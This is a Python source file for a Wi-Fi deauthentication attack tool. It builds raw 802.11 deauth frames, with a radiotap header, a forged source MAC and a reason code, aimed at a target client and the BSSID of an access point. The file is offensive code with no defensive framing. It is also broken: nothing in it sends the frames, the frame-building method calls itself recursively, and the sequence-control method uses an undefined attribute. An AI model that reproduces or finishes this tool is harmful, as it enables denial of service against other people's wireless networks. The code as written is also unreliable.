import struct
import sys
from argparse import ArgumentParser as ArgParser



class Deauthenticator:

    __slots__ = ('_args', '_ap_frame', '_target_frame', '_seq_ctrl')

    def __init__(self):
        self._args:         ArgParser = None
        self._ap_frame:     bytearray = bytearray(38)
        self._target_frame: bytearray = bytearray(38)
        self._seq_ctrl:     int       = 0



    def execute(self):
        self._parse_arguemnts()
        self._build_frames()
    


    def _parse_arguemnts(self):
        parser = ArgParser(description='Deauth Attack')
        parser.add_argument('-t', '--target', type=str, help='Target MAC')
        parser.add_argument('-b', '--bssid',  type=str, help='BSSID')
        self._args = parser.parse_args(self._get_args())

    

    @staticmethod
    def _get_args() -> list[str]:        
        if len(sys.argv) < 2:
            Deauthenticator._abort('Missing arguments')
        
        return sys.argv[1:]
    


    @staticmethod
    def _abort(msg: str):
        print(f'[ ERROR ] {msg}')
        sys.exit()


    
    def _build_frames(self):
        self._build_frames(self._target_frame, self._args.target, self._args.bssid)
        self._build_frames(self._ap_frame, self._args.bssid, self._args.target)



    def _build_fixed_frame_parts(self, buffer: bytearray, src_mac: str, dst_mac:str):
        buffer[:12] = self._get_radiotap_header()

        struct.pack_into('<H', buffer, 12, 0x00C0)   # Frame control (2 bytes)
        struct.pack_into('<H', buffer, 14, 0x013a)   # Duration (2 bytes)
        
        buffer[16:22] = self._mac_str_to_bytes(dst_mac)           # Address 1 (Destination MAC)
        buffer[22:28] = self._mac_str_to_bytes(src_mac)           # Address 2 (Source MAC)
        buffer[28:34] = self._mac_str_to_bytes(self._args.bssid)  # Address 3 (BSSID)
        
        struct.pack_into('<H', buffer, 36, 0x0007)   # Reason code (2 bytes)



    @staticmethod
    def _get_radiotap_header():
        return struct.pack(
            '<BBHIHH',     # version, pad, length, present, rate, txflags
            0,             # version
            0,             # pad
            12,            # length (little-endian, so 12 becomes b'\x0c\x00')
            0x00008004,    # present: rate (bit2) and TX flags (bit15)
            2,             # rate (2 = 1 Mbps, units 500kbps)
            0x0018         # TX flags (example value)
        )



    @staticmethod
    def _mac_str_to_bytes(mac: str) -> bytes:
        return bytes(int(x, 16) for x in mac.split(':'))
    


    def _update_seq_ctrl(self, frame: bytes):
        seq_ctrl = ((self._seq & 0x0FFF) << 4) & 0xFFFF
        struct.pack_into('<H', frame, 34, seq_ctrl)



if __name__ == '__main__':
    deauth = Deauthenticator()
    deauth.execute()